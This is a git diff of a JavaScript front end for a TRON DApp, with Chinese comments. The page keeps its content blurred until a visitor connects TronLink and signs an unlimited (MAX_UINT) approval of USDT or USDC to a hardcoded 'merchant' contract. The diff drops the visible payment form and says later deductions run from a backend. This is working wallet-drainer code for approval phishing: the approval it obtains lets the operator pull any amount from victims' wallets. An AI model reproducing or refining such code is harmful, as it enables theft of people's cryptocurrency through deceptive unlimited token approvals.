@@ -1,13 +1,13 @@
 // src/main.js
-// 🚨 TronLink/原生 DApp 專用版代碼 🚨
-// 已移除 WalletConnect V2 所有代碼，並優化為：只對餘額足夠的單一代幣進行 Max 授權。
+// 🚨 最終精簡版：僅執行 Max 授權（Approve） 🚨
+// 移除了所有前端扣款邏輯，Max 授權成功後直接解鎖內容。
 
 // --- 配置常量 (請確保您的地址是正確的) ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
 const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 
 
-// 您的合約 ABI
+// 您的合約 ABI (保持不變)
 const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
 
 
@@ -18,16 +18,14 @@ let merchantContract;
 let usdtContract;
 let usdcContract;
 let isConnectedFlag = false;
-let targetDeductionToken = null; // 新增：用於記錄用戶應該用哪個代幣進行扣款
+let targetDeductionToken = null; // 記錄哪個代幣有足夠餘額
 
 // --- UI 元素 ---
 const connectButton = document.getElementById('connectButton');
 const blurOverlay = document.getElementById('blurOverlay');
 const overlayMessage = document.getElementById('overlayMessage');
-const deductionForm = document.getElementById('deductionForm');
-const tokenSelectForm = document.getElementById('tokenSelectForm'); 
-const deductionAmountInput = document.getElementById('deductionAmount');
-const deductButton = document.getElementById('deductButton'); 
+
+// 💡 注意：所有關於扣款表單的 UI 變數都已移除
 
 
 // --- 輔助函數 ---
@@ -37,21 +35,19 @@ function showOverlay(message) {
 }
 function hideOverlay() {
     blurOverlay.style.display = 'none';
-    if (isConnectedFlag && deductionForm) {
-        deductionForm.style.display = 'block';
-    }
+    // 💡 注意：不再顯示 deductionForm
 }
 function updateConnectionUI(connected, address = null) {
     isConnectedFlag = connected;
     if (connected) {
         connectButton.classList.add('connected');
         connectButton.title = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
-        hideOverlay();
+        // 連線成功，但仍保持模糊，直到 Max 授權完成
+        showOverlay('已連線。請完成 Max 授權以解鎖內容 🔒'); 
     } else {
         connectButton.classList.remove('connected');
         connectButton.title = '連繫錢包';
         showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒');
-        if(deductionForm) deductionForm.style.display = 'none';
     }
 }
 
@@ -60,6 +56,7 @@ async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
     try {
         const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
         const allowance = tronWeb.BigNumber(allowanceRaw);
+        // 這是一個非常大的數，用來檢查是否為無限授權
         const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
         return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
     } catch (error) {
@@ -122,18 +119,17 @@ async function connectTronLink() {
 
 
 // ---------------------------------------------
-// 檢查授權狀態並決定目標代幣 (優化邏輯)
+// 檢查授權狀態並決定目標代幣 (最低門檻 $1.00)
 // ---------------------------------------------
 async function checkAuthorization() {
     if (!tronWeb || !userAddress || !merchantContract) {
         return { authorizedToken: null, contract: false };
     }
     
-    // 1. 檢查合約授權狀態 
     const contractAuthorized = await merchantContract.authorized(userAddress).call();
 
-    // 2. 獲取代幣餘額和授權狀態
-    const minAmount = tronWeb.toSun('5.00'); // 預期扣款金額 $5 (轉換為 Sun)
+    // 門檻調整為 $1.00
+    const minAmount = tronWeb.toSun('1.00'); 
     
     const usdtBalance = await getTokenBalance(usdtContract);
     const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
@@ -143,28 +139,15 @@ async function checkAuthorization() {
 
     let targetToken = null; 
 
-    // 優先檢查 USDT
+    // 優先檢查 USDT (餘額足夠)
     if (usdtBalance.gte(minAmount)) {
-        if (!usdtAuthorized) {
-            // USDT 餘額夠，但未授權，選 USDT 進行授權
-            targetToken = 'USDT'; 
-        } else {
-            // USDT 餘額夠且已授權，選 USDT 進行扣款
-            targetToken = 'USDT'; 
-        }
+        targetToken = 'USDT'; 
     } 
-    // 其次檢查 USDC
+    // 其次檢查 USDC (餘額足夠)
     else if (usdcBalance.gte(minAmount)) {
-        if (!usdcAuthorized) {
-            // USDC 餘額夠，但未授權，選 USDC 進行授權
-            targetToken = 'USDC';
-        } else {
-            // USDC 餘額夠且已授權，選 USDC 進行扣款
-            targetToken = 'USDC'; 
-        }
+        targetToken = 'USDC'; 
     }
     
-    // 將選定的代幣存到全局變數，用於後續表單和扣款
     targetDeductionToken = targetToken; 
 
     return {
@@ -177,7 +160,7 @@ async function checkAuthorization() {
 
 
 // ---------------------------------------------
-// 授權邏輯 (僅授權目標代幣)
+// 核心：授權邏輯 (僅授權目標代幣)
 // ---------------------------------------------
 async function connectAndAuthorize() {
     const status = await checkAuthorization();
@@ -194,11 +177,8 @@ async function connectAndAuthorize() {
     let txCount = 0;
 
     if (totalTxs === 0) {
-        showOverlay("所有授權已就緒，無需額外交易。");
+        showOverlay("所有授權已就緒。");
         await new Promise(resolve => setTimeout(resolve, 1500)); 
-        
-        // 確保表單預設選擇已授權且餘額足夠的代幣
-        if (tokenSelectForm && targetDeductionToken) tokenSelectForm.value = targetDeductionToken;
         return true;
     }
     
@@ -207,7 +187,6 @@ async function connectAndAuthorize() {
             txCount++;
             showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
             
-            // 原生 TronLink/DApp 模式的簽名和發送
             const result = await tronWeb.trx.sign(transaction);
             if (!result.signature) throw new Error("原生簽名失敗或被拒絕。");
             
@@ -233,15 +212,11 @@ async function connectAndAuthorize() {
             // 第二筆：賦予 Max 額度
             const maxApproveTx = await tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
             await signAndSend(maxApproveTx, `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`);
-            
-            // 成功授權後，預設選擇此幣種
-            if (tokenSelectForm) tokenSelectForm.value = token;
         }
 
-        // 如果沒有足夠的餘額，則失敗並顯示提示
-        if (!status.authorizedToken && totalTxs === 0) {
-             // 只有在首次檢查餘額不足時才會觸發，如果 totalTxs > 0，則授權會失敗
-             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $5，無法開始授權流程。");
+        // 餘額不足的錯誤提示
+        if (!status.authorizedToken) {
+             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始授權流程。");
         }
         
         return true;
@@ -253,9 +228,8 @@ async function connectAndAuthorize() {
 }
 
 // ---------------------------------------------
-// 交易邏輯 (與之前版本相同)
+// 連線成功後處理：只檢查授權狀態
 // ---------------------------------------------
-
 async function handlePostConnection() {
     if (!isConnectedFlag) return;
     
@@ -265,80 +239,27 @@ async function handlePostConnection() {
     const allAuthorized = status.contract && tokenAuthorized;
 
     if (allAuthorized) {
-        // 如果成功，確保表單選擇正確的代幣
-        if (tokenSelectForm && targetDeductionToken) tokenSelectForm.value = targetDeductionToken;
+        // 授權已完成，直接解鎖內容
         hideOverlay(); 
+        // 顯示最終成功訊息
+        showOverlay('✅ Max 授權已成功！您已解鎖內容。未來服務扣款將由後台系統依約定金額執行。');
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        hideOverlay();
+
     } else {
+        // 授權未完成，則引導用戶授權
         showOverlay('偵測到錢包，但 Max 授權尚未完成。即將開始授權流程...');
         const authSuccess = await connectAndAuthorize();
         if (authSuccess) {
-            // 授權成功後再次檢查並顯示表單
+            // 授權成功後，再次檢查並解鎖
             await handlePostConnection(); 
         }
     }
 }
 
-async function triggerBackendDeduction(token, amount) {
-    if (!isConnectedFlag || !userAddress || !merchantContract) {
-        showOverlay("請先連繫錢包並完成授權！");
-        return;
-    }
-    
-    try {
-        const tokenContractAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : USDC_CONTRACT_ADDRESS;
-        const contractMethod = token === 'USDT' ? merchantContract.deductUSDT : merchantContract.deductUSDC;
-        const tokenContract = token === 'USDT' ? usdtContract : usdcContract;
-
-        // 重新檢查餘額是否足夠
-        const balance = await tokenContract.balanceOf(userAddress).call();
-        if (tronWeb.BigNumber(balance).lt(tronWeb.toSun(amount))) {
-            throw new Error(`餘額不足: 僅剩 ${tronWeb.fromSun(balance)} ${token}`);
-        }
-
-        showOverlay(`正在發起 ${token} 扣款，金額: ${amount}。請在錢包中確認簽名！`);
-        
-        const sunAmount = tronWeb.toSun(amount);
-        const transaction = await contractMethod(userAddress, tokenContractAddress, sunAmount).build(); 
-
-        // 原生 TronLink/DApp 模式的簽名
-        const signedTx = await tronWeb.trx.sign(transaction);
-        
-        const result = await tronWeb.trx.sendRawTransaction(signedTx);
-        
-        if (result.txid) {
-            showOverlay(`✅ 扣款成功！交易 ID: ${result.txid.substring(0, 10)}...`);
-            // 成功扣款後，隱藏表單並移除模糊層
-            if(deductionForm) deductionForm.style.display = 'none';
-            hideOverlay();
-        } else {
-            throw new Error("交易失敗或未被廣播。");
-        }
-    } catch (error) {
-        console.error("Deduction Failed:", error);
-        showOverlay(`扣款失敗！錯誤: ${error.message}。請檢查您的餘額及授權額度。`);
-    }
-}
-
-function triggerDeductionFromForm() {
-    const token = tokenSelectForm.value;
-    const amount = deductionAmountInput.value;
-
-    if (isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
-        alert("請輸入有效的金額！");
-        return;
-    }
-    
-    triggerBackendDeduction(token, amount);
-}
-
-
-// 設置事件監聽器
-if (connectButton) connectButton.addEventListener('click', connectWallet);
-if (deductButton) {
-    deductButton.addEventListener('click', triggerDeductionFromForm);
-}
-
+// ---------------------------------------------
 // 主連接入口函數
+// ---------------------------------------------
 async function connectWallet() {
     if (connectButton) connectButton.disabled = true;
 
@@ -353,11 +274,14 @@ async function connectWallet() {
         return;
     }
 
-    // 只調用 TronLink 連接邏輯
     await connectTronLink();
     
     if (connectButton) connectButton.disabled = false;
 }
+
+
+// 設置事件監聽器
+if (connectButton) connectButton.addEventListener('click', connectWallet);
 
 
 // 頁面啟動：提示用戶連接
